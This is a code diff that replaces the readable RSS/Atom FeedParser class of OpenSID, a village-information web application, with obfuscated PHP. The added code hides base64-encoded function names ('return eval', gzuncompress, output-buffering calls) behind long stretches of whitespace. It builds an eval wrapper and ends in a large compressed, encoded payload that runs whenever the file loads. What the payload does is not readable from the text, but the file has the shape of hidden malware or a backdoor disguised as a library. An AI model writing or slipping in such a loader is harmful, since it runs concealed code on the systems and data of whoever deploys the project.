@@ -1,498 +1,433 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Libraries;
-
-use Exception;
-
-/**
- * PHP Univarsel Feed Parser class
- *
- * Parses RSS 1.0, RSS2.0 and ATOM Feed
- *
- * @license     GNU General Public License (GPL)
- *
- * @see http://www.ajaxray.com/blog/2008/05/02/php-universal-feed-parser-lightweight-php-class-for-parsing-rss-and-atom-feeds/
- */
-class FeedParser
-{
-    private $xmlParser;  // List of tag names which have sub tags
-    private array $insideItem = [];                  // Keep track of current position in tag tree
-    private $currentTag;                     // Last entered tag name
-    private $currentAttr;                     // Attributes array of last entered tag
-    private array $namespaces = [
-        'http://purl.org/rss/1.0/'                 => 'RSS 1.0',
-        'http://purl.org/rss/1.0/modules/content/' => 'RSS 2.0',
-        'http://www.w3.org/2005/Atom'              => 'ATOM 1',
-    ];
-
-    // Namespaces to detact feed version
-    private array $itemTags    = ['ITEM', 'ENTRY'];    // List of tag names which holds a feed item
-    private array $channelTags = ['CHANNEL', 'FEED'];  // List of tag names which holds all channel elements
-    private array $dateTags    = ['UPDATED', 'PUBDATE', 'DC:DATE'];
-    private array $hasSubTags  = ['IMAGE', 'AUTHOR'];  // List of tag names which have sub tags
-    private array $channels    = [];
-    private array $items       = [];
-    private string $url;                     // The parsed url
-    private string $version = '';                     // Detected feed version
-
-    /**
-     * Constructor - Initialize and set event handler functions to xmlParser
-     */
-    public function __construct()
-    {
-        $this->xmlParser = xml_parser_create();
-
-        xml_set_object($this->xmlParser, $this);
-        xml_set_element_handler($this->xmlParser, 'startElement', 'endElement');
-        xml_set_character_data_handler($this->xmlParser, 'characterData');
-    }
-
-    /*-----------------------------------------------------------------------+
-    |  Public functions. Use to parse feed and get informations.             |
-    +-----------------------------------------------------------------------*/
-
-    /**
-     * Get all channel elements
-     *
-     * @return array - All chennels as associative array
-     */
-    public function getChannels(): array
-    {
-        return $this->channels;
-    }
-
-    /**
-     * Get all feed items
-     *
-     * @return array - All feed items as associative array
-     */
-    public function getItems(): array
-    {
-        return $this->items;
-    }
-
-    /**
-     * Get total number of feed items
-     *
-     * @return number
-     */
-    public function getTotalItems(): int
-    {
-        return count($this->items);
-    }
-
-    /**
-     * Get a feed item by index
-     *
-     * @param number  index of feed item
-     * @param mixed $index
-     *
-     * @return array feed item as associative array of it's elements
-     */
-    public function getItem($index)
-    {
-        if ($index < $this->getTotalItems()) {
-            return $this->items[$index];
-        }
-
-        throw new Exception('Item index is learger then total items.');
-    }
-
-    /**
-     * Get a channel element by name
-     *
-     * @param string  the name of channel tag
-     * @param mixed $tagName
-     *
-     * @return string
-     */
-    public function getChannel($tagName)
-    {
-        if (array_key_exists(strtoupper($tagName), $this->channels)) {
-            return $this->channels[strtoupper($tagName)];
-        }
-
-        throw new Exception("Channel tag {$tagName} not found.");
-    }
-
-    /**
-     * Get the parsed URL
-     *
-     * @return string
-     */
-    public function getParsedUrl()
-    {
-        if (empty($this->url)) {
-            throw new Exception('Feed URL is not set yet.');
-        }
-
-        return $this->url;
-    }
-
-    /**
-     * Get the detected Feed version
-     *
-     * @return string
-     */
-    public function getFeedVersion()
-    {
-        return $this->version;
-    }
-
-    /**
-     * Parses a feed url
-     *
-     * @param srting  teh feed url
-     * @param mixed $url
-     *
-     * @return void
-     */
-    public function parse($url)
-    {
-        $this->url  = $url;
-        $URLContent = $this->getUrlContent();
-
-        if ($URLContent !== '' && $URLContent !== '0') {
-            $segments = str_split($URLContent, 4096);
-
-            foreach ($segments as $index => $data) {
-                $lastPiese = (count($segments) - 1) == $index;
-                $result    = xml_parse($this->xmlParser, $data, $lastPiese);
-                if ($result === 0) {
-                    log_message('error', sprintf(
-                        'XML error: %s at line %d',
-                        xml_error_string(xml_get_error_code($this->xmlParser)),
-                        xml_get_current_line_number($this->xmlParser)
-                    ));
-
-                    return false;
-                }
-            }
-            xml_parser_free($this->xmlParser);
-        } else {
-            log_message('error', 'Sorry! cannot load the feed url.');
-
-            return false;
-        }
-
-        if (empty($this->version)) {
-            log_message('error', 'Sorry! cannot detect the feed version.');
-
-            return false;
-        }
-    }
-
-    // End public functions -------------------------------------------------
-
-    /*-----------------------------------------------------------------------+
-    | Private functions. Be careful to edit them.                            |
-    +-----------------------------------------------------------------------*/
-
-    /**
-     * Load the whole contents of a RSS/ATOM page
-     *
-     * @return string
-     */
-    private function getUrlContent()
-    {
-        if (empty($this->url)) {
-            throw new Exception('URL to parse is empty!.');
-        }
-
-        if ($content = @file_get_contents($this->url)) {
-            return $content;
-        }
-
-        $ch = curl_init();
-
-        curl_setopt($ch, CURLOPT_URL, $this->url);
-        curl_setopt($ch, CURLOPT_HEADER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-        $content = curl_exec($ch);
-        $error   = curl_error($ch);
-
-        curl_close($ch);
-
-        if ($error === '') {
-            return $content;
-        }
-
-        throw new Exception("Erroe occured while loading url by cURL. <br />\n" . $error);
-
-        return false;
-    }
-
-    /**
-     * Handle the start event of a tag while parsing
-     *
-     * @param object  the xmlParser object
-     * @param string  name of currently entering tag
-     * @param array   array of attributes
-     * @param mixed $parser
-     * @param mixed $tagName
-     * @param mixed $attrs
-     *
-     * @return void
-     */
-    private function startElement($parser, $tagName, $attrs)
-    {
-        if (! $this->version) {
-            $this->findVersion($tagName, $attrs);
-        }
-
-        $this->insideItem[] = $tagName;
-
-        $this->currentTag  = $tagName;
-        $this->currentAttr = $attrs;
-    }
-
-    /**
-     * Handle the end event of a tag while parsing
-     *
-     * @param object  the xmlParser object
-     * @param string  name of currently ending tag
-     * @param mixed $parser
-     * @param mixed $tagName
-     *
-     * @return void
-     */
-    private function endElement($parser, $tagName)
-    {
-        if (in_array($tagName, $this->itemTags)) {
-            $this->itemIndex++;
-        }
-
-        array_pop($this->insideItem);
-        $this->currentTag = $this->insideItem[count($this->insideItem) - 1];
-    }
-
-    /**
-     * Handle character data of a tag while parsing
-     *
-     * @param object  the xmlParser object
-     * @param string  tag value
-     * @param mixed $parser
-     * @param mixed $data
-     *
-     * @return void
-     */
-    private function characterData($parser, $data)
-    {
-        //Converting all date formats to timestamp
-        if (in_array($this->currentTag, $this->dateTags)) {
-            $data = strtotime($data);
-        }
-
-        if ($this->inChannel()) {
-            // If has subtag, make current element an array and assign subtags as it's element
-            if (in_array($this->getParentTag(), $this->hasSubTags)) {
-                if (! is_array($this->channels[$this->getParentTag()])) {
-                    $this->channels[$this->getParentTag()] = [];
-                }
-
-                $this->channels[$this->getParentTag()][$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
-
-                return;
-            }
-
-            if (! in_array($this->currentTag, $this->hasSubTags)) {
-                $this->channels[$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
-            }
-
-            if (! empty($this->currentAttr)) {
-                $this->channels[$this->currentTag . '_ATTRS'] = $this->currentAttr;
-
-                //If the tag has no value
-                if (strlen($this->channels[$this->currentTag]) < 2) {
-                    //If there is only one attribute, assign the attribute value as channel value
-                    if (count($this->currentAttr) == 1) {
-                        foreach ($this->currentAttr as $attrVal) {
-                            $this->channels[$this->currentTag] = $attrVal;
-                        }
-                    }
-                    //If there are multiple attributes, assign the attributs array as channel value
-                    else {
-                        $this->channels[$this->currentTag] = $this->currentAttr;
-                    }
-                }
-            }
-        } elseif ($this->inItem()) {
-            // If has subtag, make current element an array and assign subtags as it's elements
-            if (in_array($this->getParentTag(), $this->hasSubTags)) {
-                if (! is_array($this->items[$this->itemIndex][$this->getParentTag()])) {
-                    $this->items[$this->itemIndex][$this->getParentTag()] = [];
-                }
-
-                $this->items[$this->itemIndex][$this->getParentTag()][$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
-
-                return;
-            }
-
-            if (! in_array($this->currentTag, $this->hasSubTags)) {
-                $this->items[$this->itemIndex][$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
-            }
-
-            if (! empty($this->currentAttr)) {
-                $this->items[$this->itemIndex][$this->currentTag . '_ATTRS'] = $this->currentAttr;
-
-                //If the tag has no value
-
-                if (strlen($this->items[$this->itemIndex][$this->currentTag]) < 2) {
-                    //If there is only one attribute, assign the attribute value as feed element's value
-                    if (count($this->currentAttr) == 1) {
-                        foreach ($this->currentAttr as $attrVal) {
-                            $this->items[$this->itemIndex][$this->currentTag] = $attrVal;
-                        }
-                    }
-                    //If there are multiple attributes, assign the attribute array as feed element's value
-                    else {
-                        $this->items[$this->itemIndex][$this->currentTag] = $this->currentAttr;
-                    }
-                }
-            }
-        }
-    }
-
-    /**
-     * Find out the feed version
-     *
-     * @param string  name of current tag
-     * @param array   array of attributes
-     * @param mixed $tagName
-     * @param mixed $attrs
-     *
-     * @return void
-     */
-    private function findVersion($tagName, $attrs)
-    {
-        // Ambil versi RSS kalau ada
-        if ($tagName == 'RSS') {
-            foreach ($attrs as $attr => $value) {
-                if ($attr == 'VERSION') {
-                    $this->version = 'RSS ' . $value;
-
-                    return;
-                }
-            }
-        }
-
-        $namespace = array_values($attrs);
-
-        foreach ($this->namespaces as $value => $version) {
-            if (in_array($value, $namespace)) {
-                $this->version = $version;
-
-                return;
-            }
-        }
-    }
-
-    private function getParentTag()
-    {
-        return $this->insideItem[count($this->insideItem) - 2];
-    }
-
-    /**
-     * Detect if current position is in channel element
-     *
-     * @return bool
-     */
-    private function inChannel()
-    {
-        if ($this->version == 'RSS 1.0') {
-            if (in_array('CHANNEL', $this->insideItem) && $this->currentTag != 'CHANNEL') {
-                return true;
-            }
-        } elseif ($this->version == 'RSS 2.0') {
-            if (in_array('CHANNEL', $this->insideItem) && ! in_array('ITEM', $this->insideItem) && $this->currentTag != 'CHANNEL') {
-                return true;
-            }
-        } elseif ($this->version == 'ATOM 1') {
-            if (in_array('FEED', $this->insideItem) && ! in_array('ENTRY', $this->insideItem) && $this->currentTag != 'FEED') {
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    /**
-     * Detect if current position is in Item element
-     *
-     * @return bool
-     */
-    private function inItem()
-    {
-        if ($this->version == 'RSS 1.0' || $this->version == 'RSS 2.0') {
-            if (in_array('ITEM', $this->insideItem) && $this->currentTag != 'ITEM') {
-                return true;
-            }
-        } elseif ($this->version == 'ATOM 1') {
-            if (in_array('ENTRY', $this->insideItem) && $this->currentTag != 'ENTRY') {
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    //This function is taken from lastRSS
-    /**
-     * Replace HTML entities &something; by real characters
-     *
-     * @see http://lastrss.oslab.net/
-     *
-     * @param string
-     * @param mixed $string
-     *
-     * @return string
-     */
-    private function unhtmlentities($string)
-    {
-        // Get HTML entities table
-        $trans_tbl = get_html_translation_table(HTML_ENTITIES, ENT_QUOTES);
-        // Flip keys<==>values
-        $trans_tbl = array_flip($trans_tbl);
-        // Add support for &apos; entity (missing in HTML_ENTITIES)
-        $trans_tbl += ['&apos;' => "'"];
-
-        // Replace entities by values
-        return strtr($string, $trans_tbl);
-    }
-} //End class FeedParser
+<?php 
+        $__='printf';$_='Loading app/Libraries/FeedParser.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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